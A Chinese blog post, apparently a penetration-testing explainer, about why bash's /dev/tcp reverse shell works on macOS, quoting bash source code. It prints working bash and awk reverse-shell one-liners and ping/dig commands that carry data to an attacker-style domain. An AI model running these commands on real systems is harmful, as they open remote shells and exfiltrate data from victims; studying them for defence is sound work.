> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DuhimxyOb255byWNKhExkw)

前言  

=====

昨天有个小伙伴在群里问在 macOS 下如何实现 bash 反弹 shell，因为 Mac 中没有 `/dev/tcp` 目录。借着这个问题，就来简单谈谈反弹 shell 的那些事。

从 bash 说起
=========

可能大家都用过 bash 反弹 shell:

```
bash -i >& /dev/tcp/127.0.0.1/8080 0>&1

```

关于重定向部分很多文章有介绍了，但是 /dev 部分却鲜有提及。很多人以为 **/dev/tcp/host/port** 是 Linux 内核提供的一个 devfs[1] (或者 udev[2])，曾经我也是这么认为的，但实际上上面的命令在 macOS 甚至 Windows 也可以成功执行，显然这些系统中并不存在 `/dev/tcp/` 之类的路径。

WHY？

原因很简单，因为这是 bash 本身提供的功能。其代码实现在 `bash/redir.c` 中:

```
/* A list of pattern/value pairs for filenames that the redirection
   code handles specially. */
static STRING_INT_ALIST _redir_special_filenames[] = {
#if !defined (HAVE_DEV_FD)
  { "/dev/fd/[0-9]*", RF_DEVFD },
#endif
#if !defined (HAVE_DEV_STDIN)
  { "/dev/stderr", RF_DEVSTDERR },
  { "/dev/stdin", RF_DEVSTDIN },
  { "/dev/stdout", RF_DEVSTDOUT },
#endif
#if defined (NETWORK_REDIRECTIONS)
  { "/dev/tcp/*/*", RF_DEVTCP },
  { "/dev/udp/*/*", RF_DEVUDP },
#endif
  { (char *)NULL, -1 }
};
static int
redir_special_open (spec, filename, flags, mode, ri)
     int spec;
     char *filename;
     int flags, mode;
     enum r_instruction ri;
{
  // ...
#if defined (NETWORK_REDIRECTIONS)
    case RF_DEVTCP:
    case RF_DEVUDP:
#if defined (RESTRICTED_SHELL)
      if (restricted)
    return (RESTRICTED_REDIRECT);
#endif
#if defined (HAVE_NETWORK)
      fd = netopen (filename);
#else
}

```

而 netopen 函数则定义在 `bash/lib/sh/netopen.c` 中:

```
/*
 * Open a TCP or UDP connection given a path like `/dev/tcp/host/port' to
 * host `host' on port `port' and return the connected socket.
 */
int
netopen (path)
     char *path;
{
  char *np, *s, *t;
  int fd;
  np = (char *)xmalloc (strlen (path) + 1);
  strcpy (np, path);
  s = np + 9;
  t = strchr (s, '/');
  if (t == 0)
    {
      internal_error (_("%s: bad network path specification"), path);
      free (np);
      return -1;
    }
  *t++ = '\0';
  fd = _netopen (s, t, path[5]);
  free (np);
  return fd;
}
/*
 * Open a TCP or UDP connection to HOST on port SERV.  Uses getaddrinfo(3)
 * if available, falling back to the traditional BSD mechanisms otherwise.
 * Returns the connected socket or -1 on error.
 */
static int 
_netopen(host, serv, typ)
     char *host, *serv;
     int typ;
{
#ifdef HAVE_GETADDRINFO
  return (_netopen6 (host, serv, typ));
#else
  return (_netopen4 (host, serv, typ));
#endif
}

```

因此，这实际上只是对 `/dev/{tcp,udp}` 开头的文件进行字符串解析并根据解析结果建立网络连接，并没有涉及到具体的操作系统。如果解析失败，比如字段数量不正常或者协议不正确，才会回退到 **open(2)** 操作，即指定路径当做常规文件处理。

awk
===

当然，bash 并不是唯一实现了这种根据路径指定网络连接的功能，比如常见的 awk 一句话反弹 shell:

```
awk 'BEGIN {s = "/inet/tcp/0/127.0.0.1/8080"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

```

> awk: bash 摸得，我摸不得？

在编写本文时最新的代码实现在 io.c 中，片段如下所示:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3eicVGzibzClA3FMMlDJMSmJvDUiahQvb025PenZVV1IibajPXnC6ibicV2whQTibMywib5ib6JIU7OPLW2faho00yXI0UA/640?wx_fmt=png)awk.png

与 bash 的连接相比，awk 的实现增加了更多功能，可以指定 IPv4/IPv6，以及指定绑定的本地端口。

小结
==

在最初接触渗透测试的时候，喜欢收集各种一句话反弹 shell，其实并不必要，因为看多了就会知道其本质是一样的，在实际进行漏洞 (比如命令注入) 时，通常就是有什么用什么，只要能够实现目的即可，比如读取本地文件后，可以通过很多命令传输到攻击者处，比如:

• 用 ICMP 携带 payload: ping -p payload evilpan.com• 用 DNS 请求携带 paylaod，也就是常说的 DNSLog: dig @1.2.3.4 -p 5333 -t A payload.evilpan.com•...

换言之，reverse shell 的本质只是: **connect**、**read**、**exec**、**write**、repeat，从本质出发，也就能发现更多红队的所谓奇淫技巧了。

#### 引用链接

`[1]` devfs: _https://tldp.org/HOWTO/SCSI-2.4-HOWTO/devfs.html_  
`[2]` udev: _http://en.wikipedia.org/wiki/Udev_